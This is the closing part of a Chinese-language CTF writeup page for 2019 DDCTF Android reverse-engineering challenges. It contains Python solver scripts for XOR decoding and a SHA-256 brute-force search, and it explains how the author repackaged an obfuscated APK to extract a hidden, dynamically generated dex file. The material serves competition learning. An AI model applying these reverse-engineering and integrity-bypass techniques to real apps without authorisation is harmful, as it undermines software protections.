key=[0x9,0x17,0x16,0x3,0x12,0xB,0x1B,0x0,0x4,0x10,0x19,0x5,0x17,0x1D,0x17,0x18,0x18,0x19,0xE,0x3,0x8,0x8,0x18,0xD,0x1E,0x9,0x19,0x1E,0x13,0x0,0x1E,0x1F,0x5,0x11,0x1A,0xD,0x17,0xF,0x1C,0x7,0x1B,0xA,0x8,0x9,0x7,0x1F,0x17,0xA,0xF,0x1F,0x4,0xD,0x18,0xE,0xB,0xB,0x12,0x4,0x3,0xD,0xD,0x4,0x5,0x1D,0xE,0x11,0x8,0x5,0x15,0x1C,0x7,0x1E,0x14,0x9,0x1F,0x2,0xD,0xE,0xA,0x19]
tele=[3,25,14,9,1,13,26,20,6,11,15,18,28,12,24,22,23,10,5,16,7,30,19,29,21,17,0,4,8,2,27]

flag=&apos;ZF&apos;
enc=&apos;&apos;

for i in range(2):
    tmp=tele[table.index(flag[i])]
    for j in range(10):
        tmp^=key[j*8+i]
    enc+=table[tele.index(tmp)]

print enc

i=0
succ=0
for a in table:
    for b in table:
        for c in table:
            for d in table:
                for e in table:
                    for f in table:
                        if i%100000==0: print float(i)*100/1073741824
                        tmp=enc+a+b+c+d+e+f
                        res=tmp
                        for k in range(5):
                            res=sha256(res).hexdigest()
                        i+=1
                        if res==target:
                            print tmp
                            enc=tmp
                            succ=1
                            break
                    if succ==1: break
                if succ==1: break
            if succ==1: break
        if succ==1: break
    if succ==1: break

flag=&apos;&apos;
for i in range(8):
    tmp=tele[table.index(enc[i])]
    for j in range(10):
        tmp^=key[j*8+i]
    flag+=table[tele.index(tmp)]

print &apos;DDCTF{ddctf-android-lorenz-%s}&apos; % flag
</code></pre><p>&#x8DD1;&#x5927;&#x6982;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#x5DE6;&#x53F3;&#xFF0C;&#x5C31;&#x80FD;&#x8DD1;&#x5230; Flag &#x4E86;&#x3002;</p>
<p>Flag: <code>DDCTF{ddctf-android-******-ZFPQETDB}</code></p>
<h3 id="have-fun"><a name="have-fun" class="anchor-navigation-ex-anchor" href="#have-fun"><i class="fa fa-link" aria-hidden="true"></i></a>2.4.2. Have Fun</h3>
<blockquote>
<p>&#x8FD9;&#x9898;&#x771F;&#x4EE4;&#x4EBA;&#x5934;&#x75BC;&#x3002;&#x53D8;&#x91CF;&#x540D;&#x5168;&#x90E8;&#x7ECF;&#x8FC7; Unicode&#x6DF7;&#x6DC6;&#xFF0C;&#x5B57;&#x7B26;&#x4E32;&#x5168;&#x90E8;&#x7ECF;&#x8FC7; &#x52A8;&#x6001;&#x89E3;&#x5BC6;&#x6DF7;&#x6DC6;&#xFF0C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x8FD8;&#x63D2;&#x4E86; &#x5783;&#x573E;&#x6307;&#x4EE4; &#x5BFC;&#x81F4;&#x751F;&#x6210;&#x4F2A;&#x4EE3;&#x7801;&#x5931;&#x8D25;&#x3002;</p>
</blockquote>
<p>&#x5C1D;&#x8BD5;&#x52A8;&#x6001;&#x8C03;&#x8BD5;&#xFF0C;&#x76F4;&#x63A5;&#x95EA;&#x9000;&#xFF0C;<code>logcat</code> &#x663E;&#x793A; <code>loadlibrary</code> &#x65F6;&#x629B;&#x51FA; <code>has invalid shdr offset/size</code> &#x9519;&#x8BEF;&#x3002;&#x4E0A;&#x7F51;&#x67E5;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0; Android &gt;= 7 &#x65F6;&#x5F00;&#x542F;&#x4E86;&#x8BF8;&#x591A;&#x5BF9; .so &#x6587;&#x4EF6;&#x7684;&#x68C0;&#x6D4B;&#x3002;&#x800C;&#x8FD9;&#x9053;&#x9898;&#x7684; .so &#x5934;&#x90E8;&#x88AB;&#x4FEE;&#x6539;&#x8FC7;&#xFF0C;&#x6240;&#x4EE5;&#x8FC7;&#x4E0D;&#x4E86;&#x8FD9;&#x4E2A;&#x68C0;&#x6D4B;&#x3002;<br>&#x5148;&#x5BF9; <code>libhwFGfOp0EzktJb.so</code> &#x8FDB;&#x884C;&#x5206;&#x6790;&#x3002;<br><img src="https://impakho.com/images/ae065d71edccda0aa10d91a4721423f4.png" alt=""><br>&#x6B64;&#x5904;&#x4F1A;&#x5224;&#x65AD;&#x8F93;&#x5165;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;14&#x5B57;&#x8282;&#x3002;<br><img src="https://impakho.com/images/56f81938495f6afec55be9ddbd376e9d.png" alt=""><br>&#x7136;&#x540E;&#x4E0E; <code>off_2910</code> &#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x3002;</p>
<pre class="language-"><code>off_2910 = @n|ixihPIppqws
</code></pre><p>&#x518D;&#x5206;&#x6790;&#x4E00;&#x4E0B; smali &#x4EE3;&#x7801;&#x3002;&#x53D1;&#x73B0;&#x5B83;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x4E00;&#x4E2A;&#x5916;&#x90E8; dex &#x6587;&#x4EF6;&#xFF1A;<code>assets/Y2xhc3Nlc19kZC5kZXg=</code>&#x3002;
<img src="https://impakho.com/images/cc8b28875d30c8e630e14a6a7fe481bc.png" alt="">
&#x8FD9;&#x91CC;&#x4F1A;&#x5BF9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x8FDB;&#x884C; Encode&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4EA4;&#x7531; .so &#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x3002;<br>&#x5199;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF0C;&#x53D1;&#x73B0;&#x63D0;&#x4EA4;&#x7B54;&#x6848;&#x59CB;&#x7EC8;&#x4E0D;&#x6B63;&#x786E;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x5361;&#x4E86;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF0C;&#x540E;&#x6765;&#x91CD;&#x65B0;&#x5BA1;&#x8BA1; smali &#x4EE3;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x81EA;&#x5DF1;&#x8FD8;&#x662F;&#x592A;&#x5E74;&#x8F7B;&#x4E86;&#xFF0C;&#x6CA1;&#x73A9;&#x61C2;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x5957;&#x8DEF;&#x3002;<br>&#x91CC;&#x9762;&#x6709;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x52A8;&#x6001;&#x4FEE;&#x6539;&#x5916;&#x90E8; dex &#x6587;&#x4EF6;&#xFF0C;&#x5F80;&#x91CC;&#x9762;&#x63D2;&#x5165;&#x4E00;&#x4E9B;&#x4EE3;&#x7801;&#xFF0C;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x5934;&#x90E8;&#x7684;&#x6821;&#x9A8C;&#x503C;&#xFF0C;&#x5E76;&#x4E14;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684; dex &#x6587;&#x4EF6;&#xFF0C;&#x91CA;&#x653E;&#x5230; <code>/sdcard/</code> &#x91CC;&#x7684;&#x4E00;&#x4E2A;&#x9690;&#x85CF;&#x6587;&#x4EF6;&#x5939;&#x91CC;&#x3002;&#x65B0;&#x6587;&#x4EF6;&#x540D;&#x4E3A; <code>dnsmanYUn12M.dex</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x624D;&#x662F;&#x771F;&#x6B63;&#x88AB;&#x8C03;&#x7528;&#x5230;&#x7684; dex &#x6587;&#x4EF6;&#x3002;&#x6CA1;&#x7406;&#x89E3;&#x9519;&#x7684;&#x8BDD;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x7528;&#x672F;&#x8BED;&#x597D;&#x50CF;&#x662F;&#x53EB;&#x4F5C; &#x70ED;&#x4FEE;&#x590D;&#xFF1F;<br>&#x90A3;&#x4E48;&#x5982;&#x4F55;&#x5F97;&#x5230;&#x65B0;&#x7684; dex &#x6587;&#x4EF6;&#x5462;&#x3002;<br>&#x641E;&#x4E86;&#x5F88;&#x4E45;&#xFF0C;&#x7EC8;&#x4E8E;&#x627E;&#x5230;&#x4E00;&#x6761;&#x884C;&#x5F97;&#x901A;&#x7684;&#x529E;&#x6CD5;&#x3002;<br>&#x7531;&#x4E8E; .so &#x88AB;&#x4FEE;&#x6539;&#x4E86;&#x5934;&#xFF0C;&#x76F4;&#x63A5;&#x8FD0;&#x884C; APK &#x4F1A;&#x95EA;&#x9000;&#xFF0C;&#x6240;&#x4EE5;&#x6CE8;&#x91CA;&#x6389; <code>smali</code> &#x91CC; <code>loadlibrary</code> &#x8FD9;&#x4E00;&#x884C;&#xFF0C;&#x91CD;&#x65B0;&#x6253;&#x5305; APK&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4E0D;&#x4F1A;&#x95EA;&#x9000;&#x4E86;&#x3002;&#x7136;&#x540E;&#x70B9;&#x51FB; Check &#x7684;&#x6309;&#x94AE;&#xFF0C;&#x8BA9;&#x5B83;&#x751F;&#x6210;&#x65B0;&#x7684; dex &#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x6CA1;&#x6709; <code>loadlibrary</code> &#x65E0;&#x6CD5;&#x8C03;&#x7528;&#x5916;&#x90E8;&#x51FD;&#x6570;&#xFF0C;&#x89E6;&#x53D1;&#x95EA;&#x9000;&#x3002;<br>&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4ECE;&#x9690;&#x85CF;&#x6587;&#x4EF6;&#x5939;&#x91CC;&#x63D0;&#x53D6;&#x51FA;&#x65B0;&#x7684; <code>dnsmanYUn12M.vdex</code> &#x548C; <code>dnsmanYUn12M.odex</code>&#x6587;&#x4EF6;&#x3002;<br>&#x7136;&#x540E;&#x624B;&#x5DE5;&#x8F6C;&#x6210; <code>dnsmanYUn12M.dex</code> &#x6587;&#x4EF6;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x5206;&#x6790;&#x3002;<br><img src="https://impakho.com/images/da20237eb094e87f36c3a0f68809e9f2.png" alt=""><br>&#x8FD9;&#x624D;&#x662F;&#x771F;&#x6B63;&#x7684; dex &#x6587;&#x4EF6;&#x3002;&#x5957;&#x8DEF;&#x771F;&#x7684;&#x6DF1;&#xFF5E;<br>&#x5199;&#x89E3;&#x5BC6;&#x811A;&#x672C;&#xFF0C;&#x4E00;&#x4E2A;&#x5F88;&#x7B80;&#x5355;&#x7684;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;  </p>
<pre class="language-"><code>enc=&apos;@n|ixihPIppqws&apos;

flag=&apos;&apos;
for i in range(len(enc)):
    flag+=chr(ord(enc[i])^(i+8))
print flag
</code></pre><p>&#x7EC8;&#x4E8E;&#x5F97;&#x5230; Flag&#x3002;</p>
<p>Flag: <code>DDCTF{Hg******_Yabbcf}</code></p>
<h2 id="&#x8BC4;&#x8BBA;&#x533A;"><a name="&#x8BC4;&#x8BBA;&#x533A;" class="anchor-navigation-ex-anchor" href="#&#x8BC4;&#x8BBA;&#x533A;"><i class="fa fa-link" aria-hidden="true"></i></a>2.5. &#x8BC4;&#x8BBA;&#x533A;</h2>
<p><strong>&#x8BF7;&#x6587;&#x660E;&#x8BC4;&#x8BBA;&#xFF0C;&#x7981;&#x6B62;&#x5E7F;&#x544A;</strong>
<img src="https://cloud.panjunwen.com/alu/&#x6247;&#x8033;&#x5149;.png" alt="&#x6247;&#x8033;&#x5149;.png" class="vemoticon-img">  </p>
<hr>
<p><div class="comment"></div></p>
<script src="//cdn.staticfile.org/jquery/3.4.0/jquery.min.js"></script>
<script src="../js/av-min.js"></script>
<script src="../js/Valine.min.js"></script>
<script src="../js/Valine.js"></script><script src="_gitbook_plugin_analytics.js"></script>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="2019national.html" class="navigation navigation-prev " aria-label="Previous page: 2019全国信安赛">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="2017national.html" class="navigation navigation-next " aria-label="Next page: 2017全国信安赛">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"2019DDCTF","level":"1.5.2","depth":2,"next":{"title":"2017全国信安赛","level":"1.5.3","depth":2,"path":"articals/2017national.md","ref":"articals/2017national.md","articles":[]},"previous":{"title":"2019全国信安赛","level":"1.5.1","depth":2,"path":"articals/2019national.md","ref":"articals/2019national.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","-highlight","prism","sitemap","analytics","search-plus","anchor-navigation-ex"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism.css"]},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2019ddctf.md","mtime":"2019-04-22T13:22:27.512Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-23T06:22:46.756Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

